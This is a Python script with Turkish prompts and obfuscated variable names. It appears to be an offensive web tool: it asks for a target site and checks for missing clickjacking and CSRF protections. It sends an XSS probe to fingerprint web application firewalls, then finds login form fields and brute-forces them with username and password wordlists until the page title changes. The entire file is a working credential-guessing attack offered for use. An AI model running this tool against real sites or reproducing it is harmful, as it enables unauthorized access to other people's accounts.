#!/usr/bin/env python3
import mechanize
import http.cookiejar as c
import sys
from bs4 import BeautifulSoup
from re import search
from urllib.request import urlopen
from urllib.error import URLError, HTTPError

a = mechanize.Browser()
b = c.LWPCookieJar()
a.set_cookiejar(b)
a.set_handle_equiv(True)
a.set_handle_redirect(True)
a.set_handle_referer(True)
a.set_handle_robots(False)
a.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
a.addheaders = [('User-agent', 'Mozilla/5.0'),
                ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                ('Accept-Encoding', 'br')]

print('''\033[1;93m
   m     ""
 mm#mm  mmm    m   m   mmm    m mm   mmm    mmm           mmm   m   m   mmm
   #      #     #m#   "   #   #"  " "   #  #"  "         #"  #   #m#   #"  #
   #      #     m#m   m"""#   #     m"""#  #             #""""   m#m   #""""
   "mm  mm#mm  m" "m  "mm"#   #     "mm"#  "#mm"    #    "#mm"  m" "m  "#mm"
\033[1;34m
''')

c = input('\033[1;34m[?]\033[0m Hedef site adresi ne: ')
if not c.startswith('http://') and not c.startswith('https://'):
    c = 'http://' + c

try:
    a.open(c, timeout=10.0)
except URLError:
    try:
        c = c.replace('http://', 'https://')
        a.open(c)
    except Exception as x:
        print(f"\033[1;31m[-]\033[0m Siteye ulaşılamıyor: {x}")
        sys.exit()

d = a.forms()
try:
    e = urlopen(c)
    f = str(e.headers._headers).lower()
    if 'x-frame-options:' not in f:
        print('\033[1;32m[+]\033[0m Clickjacking açığı var gibi')
    if 'cloudflare-nginx' in f:
        print('\033[1;31m[-]\033[0m Cloudflare koruması var')
except:
    pass

try:
    g = a.open(c).read()
    if b'type="hidden"' not in g:
        print('\033[1;32m[+]\033[0m CSRF açığı olabilir')
    h = BeautifulSoup(g, 'lxml')
    i = h.find('title')
    j = i.contents if i else ""
except Exception as x:
    print(f"\033[1;31m[-] HTML okunamadı: {x}")
    j = ""

def k():
    try:
        with open('usernames.txt', 'r') as l:
            return [m.strip() for m in l.readlines()]
    except:
        print("\033[1;31m[-] usernames.txt yok!")
        sys.exit()

def n():
    try:
        with open('passwords.txt', 'r') as l:
            return [m.strip() for m in l.readlines()]
    except:
        print("\033[1;31m[-] passwords.txt yok!")
        sys.exit()

o = k()
print('\033[1;97m[>]\033[1;m Kullanıcı adları yüklendi:', len(o))
p = n()
print('\033[1;97m[>]\033[1;m Şifreler yüklendi:', len(p))

def q():
    try:
        r = "?=<script>alert()</script>"
        s = c + r
        t = urlopen(s)
        if t.code in [406, 501]:
            print("\033[1;31m[-] Mod_Security aktif gibi")
        elif t.code == 999:
            print("\033[1;31m[-] WebKnight olabilir")
        elif t.code == 419:
            print("\033[1;31m[-] F5 BIG IP çalışıyor olabilir")
        elif t.code == 403:
            print("\033[1;31m[-] WAF var gibi")
    except HTTPError as x:
        if x.code == 403:
            print("\033[1;31m[-] WAF var gibi: Erişim engellendi")
        else:
            print(f"\033[1;31m[-] WAF kontrol hatası: {x}")
    except Exception:
        pass

q()

def u(v, w, x, y, z, aa):
    for ab in o:
        ac = 1
        print(f'\033[1;97m[>]\033[1;m Deneniyor: {ab}')
        for ad in p:
            sys.stdout.write(f'\r\033[1;97m[>]\033[1;m Şifre denendi: {ac} / {len(p)}')
            sys.stdout.flush()
            try:
                a.open(c)
                a.select_form(nr=aa)
                a.form[v] = ab
                a.form[w] = ad
                if x == "True":
                    a.form[z] = [y]
                ae = a.submit().read().lower()
                if b'username or password' in ae:
                    pass
                else:
                    af = BeautifulSoup(ae, 'lxml')
                    ag = af.find('title')
                    ah = ag.contents if ag else ""
                    if ah != j:
                        print('\n\033[1;32m[+]\033[0m Oldu galiba:')
                        print('Kullanıcı adı:', ab)
                        print('Şifre:', ad)
                        sys.exit()
            except Exception:
                continue
            ac += 1

def v():
    w = 0
    for x in d:
        y = str(x)
        z = search(r'<TextControl(.*?)=>', y)
        if z:
            z = z.group(1)
            print('\033[1;33m[!]\033[0m Kullanıcı alanı:', z)
            aa = search(r'<PasswordControl(.*?)=>', y)
            if aa:
                aa = aa.group(1)
                print('\033[1;33m[!]\033[0m Şifre alanı:', aa)
                ab = search(r'SelectControl(.*?)=', y)
                if ab:
                    ab = ab.group(1)
                    try:
                        ac = search(r'SelectControl[^<]*=[^<]*>', y)
                        ad = ac.group().split('=')[1][:-1] if ac else ""
                        print('\033[1;33m[!]\033[0m Menü var')
                        print('\033[1;33m[!]\033[0m Menü adı:', ab)
                        print('\033[1;33m[!]\033[0m Seçenekler:', ad)
                        ae = input('\033[1;34m[?]\033[0m Hangisini seçeyim: ')
                        u(z, aa, "True", ae, ab, w)
                    except Exception as x:
                        print(f"\033[1;31m[!]\033[0m Hata oldu: {x}")
                else:
                    u(z, aa, "False", "", "", w)
        w += 1
    print('\033[1;31m[-]\033[0m Uygun form yok gibi.')

v()
